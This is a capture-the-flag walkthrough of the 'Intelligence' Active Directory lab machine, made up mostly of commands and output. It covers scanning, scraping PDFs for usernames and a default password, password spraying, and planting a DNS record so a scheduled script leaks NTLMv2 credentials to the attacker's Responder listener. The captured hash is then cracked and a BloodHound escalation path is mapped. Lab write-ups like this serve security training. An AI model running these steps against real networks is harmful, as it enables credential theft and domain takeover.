
#### port scan
`└─$ nmap -p- -sSCV 10.10.10.248 --min-rate 999`
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-12 07:07 EST
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 14.79% done; ETC: 07:09 (0:01:49 remaining)
Nmap scan report for intelligence.htb (10.10.10.248)
Host is up (0.083s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Intelligence
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-12 19:39:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-12T19:40:41+00:00; +7h29m15s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2026-01-12T18:46:06
|_Not valid after:  2026-04-19T00:50:40
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-12T19:40:42+00:00; +7h29m15s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2026-01-12T18:46:06
|_Not valid after:  2026-04-19T00:50:40
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2026-01-12T18:46:06
|_Not valid after:  2026-04-19T00:50:40
|_ssl-date: 2026-01-12T19:40:41+00:00; +7h29m15s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-12T19:40:42+00:00; +7h29m15s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2026-01-12T18:46:06
|_Not valid after:  2026-04-19T00:50:40
9389/tcp  open  mc-nmf        .NET Message Framing
49669/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49725/tcp open  msrpc         Microsoft Windows RPC
49744/tcp open  msrpc         Microsoft Windows RPC
```

#### info enum
For port 80
`└─$ gobuster dir -u http://intelligence.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 111 `
```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://intelligence.htb
[+] Method:                  GET
[+] Threads:                 111
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/documents            (Status: 301) [Size: 157] [--> http://intelligence.htb/documents/]
/Documents            (Status: 301) [Size: 157] [--> http://intelligence.htb/Documents/]
```

From index page, 2 pdf files with formatted naming style, to identify pdf in this dir, write a simple py script, to request all pdf naming pdf of the whole year and write to local

```
import requests

# request
def req(url):
    resp = requests.get(url) 
    if resp.status_code == 200:
        print("Find: ", middle + ext )
        return resp.content
    else:
        return None
 
# # set url
base = 'http://intelligence.htb/documents/2020-'

ext = '-upload.pdf'

for i in range(12):
    i += 1
    if i < 10:
        mon  = '0' + str(i)
    else:
        mon = str(i)   
    # day
    for j in range(31):
        j += 1
        if j <10:
            day = '0' + str(j)
        else:
            day = str(j)
        middle = mon  + '-' + day
        url = base + middle + ext
        
        content = req(url)
        #write to host
        if content:
            with open(middle + ext , 'wb') as f:
                f.write(content)
```  
                                                                                               
┌──(ed㉿kali)-[/tmp]
`└─$ python3 req.py`
```
Find:  01-01-upload.pdf
Find:  01-02-upload.pdf
Find:  01-04-upload.pdf
Find:  06-14-upload.pdf
Find:  06-15-upload.pdf
Find:  06-21-upload.pdf
...
Find:  12-24-upload.pdf
Find:  12-28-upload.pdf
Find:  12-30-upload.pdf
```

in 06-04 find a credential:
```
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.

12-30
Internal IT Update
There has recently been some outages on our web servers. Ted has gotten a
script in place to help notify us if this happens again.
Also, after discussion following our recent security audit we are in the process
of locking down our service accounts.

to better view all content, use pdftotext to print all words to terminal
└─$ for i in /tmp/*.pdf; do 
for> pdftotext "$i" -     
for> done
```
after check the exif of each pdf, all have creator info, use script to extract all names
```
└─$ for i in /tmp/*.pdf; do
exiftool "$i"  | grep Creator | cut -d ':' -f2 | xargs
done
```

```
William.Lee
Scott.Scott
Jason.Wright
Veronica.Patel
Jennifer.Thomas
Danny.Matthews
David.Reed
...snip...
Kaitlyn.Zimmerman
Jose.Williams
Stephanie.Young
Samuel.Richardson
Tiffany.Molina
Ian.Duncan
Kelly.Long
Travis.Evans
Ian.Duncan
Jose.Williams
David.Wilson
Thomas.Hall
Ian.Duncan
Jason.Patterson
William.Lee
```             
write to a file

`└─$ for i in /tmp/*.pdf; do \n
exiftool "$i"  | grep Creator | cut -d ':' -f2 | xargs | sort -u >> user  \n
done`

`wc -l user`

for port 389  ldap
`└─$ ldapsearch -H ldap://10.10.10.248 -x -s base namingcontexts`
```
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=intelligence,DC=htb
namingcontexts: CN=Configuration,DC=intelligence,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=intelligence,DC=htb
namingcontexts: DC=DomainDnsZones,DC=intelligence,DC=htb
namingcontexts: DC=ForestDnsZones,DC=intelligence,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

`─$ ~/oscp/kerbrute userenum --dc 10.10.10.248 -d intelligence.htb user`
```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/14/26 - Ronnie Flathers @ropnop

2026/01/14 08:33:21 >  Using KDC(s):
2026/01/14 08:33:21 >  	10.10.10.248:88

2026/01/14 08:33:22 >  [+] VALID USERNAME:	 Scott.Scott@intelligence.htb
2026/01/14 08:33:22 >  [+] VALID USERNAME:	 William.Lee@intelligence.htb
2026/01/14 08:33:22 >  [+] VALID USERNAME:	 Jason.Wright@intelligence.htb
2026/01/14 08:33:22 >  [+] VALID USERNAME:	 Veronica.Patel@intelligence.htb
snip
2026/01/14 08:33:22 >  [+] VALID USERNAME:	 Thomas.Hall@intelligence.htb
2026/01/14 08:33:22 >  Done! Tested 86 usernames (86 valid) in 1.006 seconds
```

`└─$ crackmapexec smb 10.10.10.248 -u user -p 'NewIntelligenceCorpUser9876' --continue-on-success  `
```
SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
snip...
genceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 

only got 1 correct pairs
intelligence.htb\Tiffany.Molina
```
check smbprivi
`└─$ netexec smb 10.10.10.248 -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --shares`
```
SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
SMB         10.10.10.248    445    DC               [*] Enumerated shares
SMB         10.10.10.248    445    DC               Share           Permissions     Remark
SMB         10.10.10.248    445    DC               -----           -----------     ------
SMB         10.10.10.248    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.248    445    DC               C$                              Default share
SMB         10.10.10.248    445    DC               IPC$            READ            Remote IPC
SMB         10.10.10.248    445    DC               IT              READ            
SMB         10.10.10.248    445    DC               NETLOGON        READ            Logon server share
SMB         10.10.10.248    445    DC               SYSVOL          READ            Logon server share
SMB         10.10.10.248    445    DC               Users           READ
```
get user flag
`└─$ smbclient  //10.10.10.248/Users -U Tiffany.Molina%NewIntelligenceCorpUser9876   `
```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sun Apr 18 21:20:26 2021
  ..                                 DR        0  Sun Apr 18 21:20:26 2021
  Administrator                       D        0  Sun Apr 18 20:18:39 2021
  All Users                       DHSrn        0  Sat Sep 15 03:21:46 2018
  Default                           DHR        0  Sun Apr 18 22:17:40 2021
  Default User                    DHSrn        0  Sat Sep 15 03:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:11:27 2018
  Public                             DR        0  Sun Apr 18 20:18:39 2021
  Ted.Graves                          D        0  Sun Apr 18 21:20:26 2021
  Tiffany.Molina                      D        0  Sun Apr 18 20:51:46 2021

seems it is Users folder files

smb: \Tiffany.Molina\Desktop\> mget user.txt
Get file user.txt? y
```
#### foothold
`└─$ smbclient  //10.10.10.248/IT -U Tiffany.Molina%NewIntelligenceCorpUser9876   `
```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Apr 18 20:50:55 2021
  ..                                  D        0  Sun Apr 18 20:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021

		3770367 blocks of size 4096. 1457424 blocks available
smb: \> mget downdetector.ps1 

└─$ cat downdetector.ps1 
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```
use dns tool add a entry, and check what we will get        
dnstool.py
Add/modify/delete Active Directory Integrated DNS records via LDAP.
https://github.com/dirkjanm/krbrelayx/tree/master

`└─$ python3 dnstool.py -u intelligence.htb\\Tiffany.Molina -p NewIntelligenceCorpUser9876 -a add --record web-ed --data 10.10.16.8  --type A  10.10.10.248  `
```
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```
listening the response, get a credential hash
`└─$ sudo responder -I tun0 `
```
[+] Listening for events...

[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:08715513f03ceb42:4B4577AC5A1CB64B5578366EFC5AA1A5:010100000000000014883424AE85DC01EC85771F03F5251A0000000002000800320045003500490001001E00570049004E002D00440038004A0045004F004800350059005600570044000400140032004500350049002E004C004F00430041004C0003003400570049004E002D00440038004A0045004F004800350059005600570044002E0032004500350049002E004C004F00430041004C000500140032004500350049002E004C004F00430041004C00080030003000000000000000000000000020000081FA6FB4B6BB12D6981D5C466412C844FE4D5782A62E3EFB6635385EBDA951A90A001000000000000000000000000000000000000900380048005400540050002F007700650062002D00650064002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

put this is file hash
`└─$ hashcat -m 5600 hash -a 0 ~/oscp/rockyou.txt`
```
TED.GRAVES::intelligence:08715513f03ceb42:4b4577ac5a1cb64b5578366efc5aa1a5:010100000000000014883424ae85dc01ec85771f03f5251a0000000002000800320045003500490001001e00570049004e002d00440038004a0045004f004800350059005600570044000400140032004500350049002e004c004f00430041004c0003003400570049004e002d00440038004a0045004f004800350059005600570044002e0032004500350049002e004c004f00430041004c000500140032004500350049002e004c004f00430041004c00080030003000000000000000000000000020000081fa6fb4b6bb12d6981d5c466412c844fe4d5782a62e3efb6635385ebda951a90a001000000000000000000000000000000000000900380048005400540050002f007700650062002d00650064002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy

TED.GRAVES   Mr.Teddy
```
use bloodhound to view potantial way get domain
`└─$ bloodhound-python -u TED.GRAVES  -p 'Mr.Teddy' -d intelligence.htb -ns 10.10.10.248 -c All --zip`

upload th zip to bloodhound, get a path, 

`ted -> IT sup group --ReadGMSAPassword--> SVC_INT$ --allowtoDelegate--> DC --CoerceToTGT -> domain`

